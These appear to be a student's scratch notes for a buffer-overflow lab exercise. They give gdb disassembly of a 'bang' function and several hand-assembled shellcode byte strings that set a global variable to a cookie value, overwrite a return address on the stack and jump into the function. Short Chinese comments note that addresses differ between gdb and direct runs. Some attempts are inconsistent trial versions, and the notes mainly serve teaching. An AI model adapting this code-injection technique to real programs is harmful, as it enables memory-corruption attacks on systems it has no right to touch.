173     {
0x0000000000401349 <+0>:     55      push   rbp
0x000000000040134a <+1>:     48 89 e5        mov    rbp,rsp
0x000000000040134d <+4>:     48 83 ec 10     sub    rsp,0x10
0x0000000000401351 <+8>:     89 7d fc        mov    DWORD PTR [rbp-0x4],edi

174         if (global_value == cookie) {
0x0000000000401354 <+11>:    8b 15 f6 2d 00 00       mov    edx,DWORD PTR [rip+0x2df6]        # 0x404150 <global_value>
0x000000000040135a <+17>:    8b 05 e8 2d 00 00       mov    eax,DWORD PTR [rip+0x2de8]        # 0x404148 <cookie>
0x0000000000401360 <+23>:    39 c2   cmp    edx,eax
0x0000000000401362 <+25>:    75 28   jne    0x40138c <bang+67>

175             printf("Bang!: You set global_value to 0x%x\n", global_value);
0x0000000000401364 <+27>:    8b 05 e6 2d 00 00       mov    eax,DWORD PTR [rip+0x2de6]        # 0x404150 <global_value>
0x000000000040136a <+33>:    89 c6   mov    esi,eax
0x000000000040136c <+35>:    48 8d 05 fd 0c 00 00    lea    rax,[rip+0xcfd]        #
0x402070
0x0000000000401373 <+42>:    48 89 c7        mov    rdi,rax
0x0000000000401376 <+45>:    b8 00 00 00 00  mov    eax,0x0
0x000000000040137b <+50>:    e8 10 fd ff ff  call   0x401090 <printf@plt>

176             validate(2);
0x0000000000401380 <+55>:    bf 02 00 00 00  mov    edi,0x2
0x0000000000401385 <+60>:    e8 e5 08 00 00  call   0x401c6f <validate>
0x000000000040138a <+65>:    eb 1c   jmp    0x4013a8 <bang+95>

177         } else
178             printf("Misfire: global_value = 0x%x\n", global_value);
0x000000000040138c <+67>:    8b 05 be 2d 00 00       mov    eax,DWORD PTR [rip+0x2dbe]        # 0x404150 <global_value>
0x0000000000401392 <+73>:    89 c6   mov    esi,eax
0x0000000000401394 <+75>:    48 8d 05 fa 0c 00 00    lea    rax,[rip+0xcfa]        #
0x402095
0x000000000040139b <+82>:    48 89 c7        mov    rdi,rax
0x000000000040139e <+85>:    b8 00 00 00 00  mov    eax,0x0
0x00000000004013a3 <+90>:    e8 e8 fc ff ff  call   0x401090 <printf@plt>

179         exit(0);
0x00000000004013a8 <+95>:    bf 00 00 00 00  mov    edi,0x0
0x00000000004013ad <+100>:   e8 7e fd ff ff  call   0x401130 <exit@plt>

global_value 0x404150
rsp = 0x7fffffffe000
rsp - global_value = 7fffffbf9eb0

0x0000000000401349 <+0>:     55      push   rbp
0x000000000040134a <+1>:     48 89 e5        mov    rbp,rsp
0x000000000040134d <+4>:     48 83 ec 10     sub    rsp,0x10


68 54 13 40 00  push 0x401354
0x0000000000001131 <+8>:     b8 50 41 40 00  mov    eax,0x404150
0x0000000000001136 <+13>:    c7 00 c3 7d 0d 0c       mov    DWORD PTR [rax],0xc0d7dc3
c3 ret

68 54 13 40 00 b8 50 41 40 00 c7 00 c3 7d 0d 0c c3

68 54 13 40 00 b8 50 41 
40 00 c7 00 c3 7d 0d 0c 
c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
30 e0 ff ff ff 7f 00 00
d0 df ff ff ff 7f 00 00

68 54 13 40 00 b8 50 41 40 00 c7 00 c3 7d 0d 0c c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00

0x7fffffffdfc0

0x0000000000401349 <+0>:     55      push   rbp
0x000000000040134a <+1>:     48 89 e5        mov    rbp,rsp
0x000000000040134d <+4>:     48 83 ec 10     sub    rsp,0x10
0x0000000000001131 <+8>:     b8 50 41 40 00  mov    eax,0x404150
0x0000000000001136 <+13>:    c7 00 c3 7d 0d 0c       mov    DWORD PTR [rax],0xc0d7dc3
0x0000000000001131 <+8>:     48 b8 54 13 40 00 00 00 00 00  movq    rax,0x401354
 ff e0 jmp rax
48 b8 54 13 40 00 00 00 00 00

55 48 89 e5 48 83 ec 10 
b8 50 41 40 00 c7 00 c3 
7d 0d 0c 48 b8 54 13 40 
00 00 00 00 00 ff e0 00
20 e0 ff ff ff 7f 00 00 
c0 df ff ff ff 7f 00 00 
55 48 89 e5 48 83 ec 10 b8 50 41 40 00 c7 00 c3 7d 0d 0c 48 b8 54 13 40 00 00 00 00 00 ff e0 00 20 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00 


55 48 89 e5 48 83 ec 10 b8 50 41 40 00 c7 00 c3 7d 0d 0c 48 b8 54 13 40 00 00 00 00 00 ff e0 00 20 e0 ff ff ff 7f 00 00 49 40 13 00 00 00 00 00 



"\x48\xb8\x50\x41\x40\x00\x00\x00\x00\x00"
48 b8 50 41 40 00 00 00 00 00

68 54 13 40 00  push 0x401354
0x0000000000001131 <+8>:     48 b8 50 41 40 00 00 00 00 00  movq    rax,0x404150
0x0000000000001136 <+13>:    c7 00 c3 7d 0d 0c       mov    DWORD PTR [rax],0xc0d7dc3
c3 ret

68 54 13 40 00 48 b8 50 
41 40 00 00 00 00 00 c7 
00 c3 7d 0d 0c c3 00 00 
00 00 00 00 00 00 00 00 
30 e0 ff ff ff 7f 00 00
d0 df ff ff ff 7f 00 00

68 54 13 40 00 48 b8 50 41 40 00 00 00 00 00 c7 00 c3 7d 0d 0c c3 00 00 00 00 00 00 00 00 00 00 30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00

0x0000000000001131 <+8>:     48 b8 50 41 40 00 00 00 00 00  movq    rax,0x404150
0x0000000000001136 <+13>:    c7 00 c3 7d 0d 0c       mov    DWORD PTR [rax],0xc0d7dc3
0x0000000000001131 <+8>:     48 b8 54 13 40 00 00 00 00 00  movq    rax,0x401354
ff e0 jmp rax

48 b8 50 41 40 00 00 00 
00 00 c7 00 c3 7d 0d 0c 
48 b8 54 13 40 00 00 00 
00 00 ff e0 00 00 00 00
30 e0 ff ff ff 7f 00 00
d0 df ff ff ff 7f 00 00

48 b8 50 41 40 00 00 00 00 00 c7 00 c3 7d 0d 0c 48 b8 49 13 40 00 00 00 00 00 ff e0 00 00 00 00 30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00

68 6a 13 40 00  push 0x40136a
0x0000000000001131 <+8>:     b8 c3 d7 c0 00  mov    eax,0xc0d7dc3
c3 ret

68 6a 13 40 00 b8 50 41 
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
30 e0 ff ff ff 7f 00 00
d0 df ff ff ff 7f 00 00

68 6a 13 40 00 b8 c3 d7 c0 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00
// second
68 64 13 40 00 b8 c3 d7 c0 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00


68 6a 13 40 00  push 0x40136a
c3 ret

68 6a 13 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00


Q:
直接运行和gdb不一致，可能gdb不能过，直接运行可以过，原因在于栈地址不一样

不同终端地址不一样，

每次重启地址随机化都会重置

0:   8b 04 25 48 41 40 00    mov    0x404148,%eax
7:   89 04 25 50 41 40 00    mov    %eax,0x404150
e:   48 c7 c2 49 13 40 00    mov    $0x401349,%rdx
15:  ff e2                   jmp    *%rdx

8b 04 25 48 41 40 00 
89 04 25 50 41 40 00 
48 c7 c2 49 13 40 00 
ff e2 
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 d0 df ff ff ff 7f 00 00



0:   8b 04 25 48 41 40 00    mov    0x404148,%eax //把 cookie 的值移入 %eax
7:   89 04 25 50 41 40 00    mov    %eax,0x404150 //把%eax 的值移入  global_value
e:   68 69 14 40 00          push   $0x401469 //将合法返回地址入栈
13:   48 c7 c2 49 13 40 00    mov    $0x401349,%rdx // 将bang的首指令地址移到 %rdx
1a:   ff e2                   jmp    *%rdx //跳到bang的首指令

8b 04 25 48 41 40 00 
89 04 25 50 41 40 00 
68 69 14 40 00 
48 c7 c2 49 13 40 00 
ff e2 
00 00 00 00 
30 e0 ff ff ff 7f 00 00 d0 df ff ff ff 7f 00 00
